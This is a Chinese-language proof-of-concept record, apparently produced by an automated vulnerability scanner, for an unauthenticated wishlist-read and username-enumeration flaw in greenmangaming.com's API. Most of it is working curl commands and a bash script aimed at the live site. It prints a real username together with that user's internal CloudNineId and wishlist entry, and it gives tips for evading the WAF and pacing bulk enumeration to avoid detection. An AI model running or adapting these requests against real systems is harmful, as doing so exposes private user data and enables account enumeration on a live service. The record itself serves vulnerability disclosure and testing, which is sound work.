# greenmangaming.com /api/v2/wants/wantlist?username= 免认证读取他人愿望单（泄露 CloudNineId + 游戏清单，兼作用户名存在性枚举）

- **code**: greenmangaming-wantlist-unauth-user-wishlist-read
- **kind**: poc
- **category**: unauthorized
- **component**: greenmangaming.com 用户愿望单 API（/api/v2/wants/wantlist）
- **versions**: 2026-11 线上版本（端点定义见 main.js ApiService）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#6 / finding_id=91（finding_checks.verdict=verified）：2026-11-11 在 ARTEX 执行机经平台记录代理对 www.greenmangaming.com 实测，全程无 Cookie/无 Authorization —— ① GET /api/v2/wants/wantlist?username=akassassinn1 → HTTP 200 {\"Bookmark\":\"[[\\\"15bc1044-7373-4153-8752-da742707f56b\\\",1575543853253],\\\"15bc1044-7373-4153-8752-da742707f56b:Devil May Cry 5 - PC\\\"]\",\"Count\":1,\"Games\":[],\"More\":false}，返回的 CloudNineId 与该用户游戏页评论数据中的 CloudNineId 完全一致，证明返回的是真实用户私有数据而非固定回显；② 阴性对照 ?username=zzqnope12345 → 200 null（用户不存在），?username=staff → 200 {\"Bookmark\":null,\"Count\":0,...}（存在但无愿望单），形成二值分叉；③ 独立预言机交叉验证 GET /api/v2/check_username?username=akassassinn1 → 400 \"Username already exists\"，zzqnope12345 → 204，确认账号真实存在。
- **path**: pocs/greenmangaming-wantlist-unauth-user-wishlist-read/greenmangaming_wantlist_unauth_read.sh
- **tags**: greenmangaming, wants, wantlist, wishlist, idor, unauthorized, broken-access-control, username-enum, cloudnineid, api-v2, main.js-api-leak
- **created_at**: 2026-11-11T15:50:12.708Z
- **engine**: https://www.greenmangaming.com
- **found_by**: vuln-scan

## 描述

greenmangaming.com 的愿望单读接口 /api/v2/wants/wantlist 只以 URL 参数 username 定位用户，服务端不下发、也不校验任何会话/所有权凭据，匿名即可读取任意已存在用户名对应的愿望单（Bookmark/Count/Games），并直接泄露其内部用户标识 CloudNineId 与愿望单条目名（游戏名+时间戳）。同时该端点的存在/不存在响应形态不同（对象 vs null），可当用户名存在性预言机使用。端点定义来自站点测试页 /gsdrhtfdguf/ 引用的 main.js 中 ApiService，属清单外未测端点。适用面：同套 GMG 前端（www.greenmangaming.com/api/v2/*）任意可达实例。

## 用法

```
【前置】匿名可达，无需 Cookie / Authorization / XSRF；建议带浏览器 UA（$ARTEX_UA），HTTPS 直连 www.greenmangaming.com；无需登录。

【步骤 1 主判据——免认证读取他人愿望单】
curl -s -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/wants/wantlist?username=akassassinn1"
  → HTTP 200，JSON 对象，含 Bookmark / Count / Games / More。
  例：{"Bookmark":"[[\"15bc1044-7373-4153-8752-da742707f56b\",1575543853253],\"15bc1044-7373-4153-8752-da742707f56b:Devil May Cry 5 - PC\"]","Count":1,"Games":[],"More":false}
  Bookmark 字段即目标 CloudNineId(UUID) + 愿望单条目名；Count/Games 为条目数量与游戏清单。

【步骤 2 阴性对照（证明按 username 查真实数据，非固定回显）】
curl -s -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/wants/wantlist?username=zzqnope12345"   → 200 null            （用户不存在）
curl -s -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/wants/wantlist?username=staff"          → 200 {"Bookmark":null,"Count":0,"Games":[],"More":false}  （存在但无愿望单）

【步骤 3 用户名存在性预言机（独立交叉验证，选做）】
curl -s -o /dev/null -w '%{http_code}\n' -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=akassassinn1"
  → 400 = 已存在；204 = 可用。（同库另条：greenmangaming-check-username-username-enum-oracle）

【请求包参考】
GET /api/v2/wants/wantlist?username=akassassinn1 HTTP/1.1
Host: www.greenmangaming.com
User-Agent: <browser UA>
（无 Cookie / 无 Authorization）

【判据汇总】① 无凭据 200 且返回可解析的愿望单对象＝成立；② 随机用户名返回 null＝数据按 username 查真实用户；③ 用 check_username 或评论数据里的 CloudNineId 交叉比对一致＝确属该用户私有数据。

【失败/常见原因】返回 403 或 HTML 挑战页＝边缘/WAF 拦截（换 UA、降速、加 Referer: https://www.greenmangaming.com/ 重试）；返回 200 null＝用户名不存在或被清理，先换 check_username 确认存在性；返回 404/501＝端点版本变动，回 main.js 重新提取 ApiService 里的路径（wantlist:p+"/wants/wantlist"，p=https://www.greenmangaming.com/api/v2）。批量枚举时控制速率，避免触发风控。
```

## 正文

```
# greenmangaming.com /api/v2/wants/wantlist —— 免认证读取他人愿望单
# 用法: UA="$ARTEX_UA" ./greenmangaming_wantlist_unauth_read.sh <username>

USER="${1:-akassassinn1}"
UA="${UA:-$ARTEX_UA}"
BASE="https://www.greenmangaming.com/api/v2"

echo "[*] 主判据: 无 Cookie/无 Authorization 读取 $USER 的愿望单"
curl -s -i -A "$UA" "$BASE/wants/wantlist?username=$USER"
echo
echo "[*] 阴性对照: 不存在的用户名"
curl -s -A "$UA" "$BASE/wants/wantlist?username=zzqnope12345"; echo
echo "[*] 存在但无愿望单的账号"
curl -s -A "$UA" "$BASE/wants/wantlist?username=staff"; echo
echo "[*] 存在性预言机 (400=已存在 / 204=可用)"
curl -s -o /dev/null -w 'http_code=%{http_code}\n' -A "$UA" "$BASE/check_username?username=$USER"

# ---- 原始观测（2026-11-11, finding_id=91）----
# GET /api/v2/wants/wantlist?username=akassassinn1  (无 Cookie)
# HTTP/1.1 200
# {"Bookmark":"[[\"15bc1044-7373-4153-8752-da742707f56b\",1575543853253],\"15bc1044-7373-4153-8752-da742707f56b:Devil May Cry 5 - PC\"]","Count":1,"Games":[],"More":false}
#
# ?username=zzqnope12345 -> 200 null
# ?username=staff        -> 200 {"Bookmark":null,"Count":0,"Games":[],"More":false}
# /api/v2/check_username?username=akassassinn1 -> 400 "Username already exists..."
# /api/v2/check_username?username=zzqnope12345 -> 204
#
# 端点来源: /gsdrhtfdguf/ 测试页引用的 main.js 中 ApiService 定义
#   wantlist: p + "/wants/wantlist"   (p = https://www.greenmangaming.com/api/v2)
# 证据留存: /opt/artex/data/tasks/6/i813/wantlist_ev.txt, probe_get.txt, api_urls.tsv

```
